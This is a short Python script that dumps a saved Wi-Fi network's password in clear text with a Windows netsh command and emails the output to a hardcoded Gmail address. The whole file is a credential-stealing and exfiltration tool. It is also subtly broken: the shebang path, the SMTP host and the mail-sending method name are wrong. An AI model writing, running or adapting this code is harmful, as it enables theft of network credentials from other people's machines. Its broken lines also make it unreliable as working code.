#!usr/bin/env python
import subprocess, smtplib

def send_email(address, password, message):
    server = smtplib.SMTP("smtp.google.com", 587)
    server.starttls()
    server.login(address, password)
    server.sendemail(address,address, message)
    server.quit()

command = "netsh wlan show profile ALHN-88AD key=clear"
result = subprocess.check_output(command, shell=True)
send_email("email@gmail.com", "password", result)
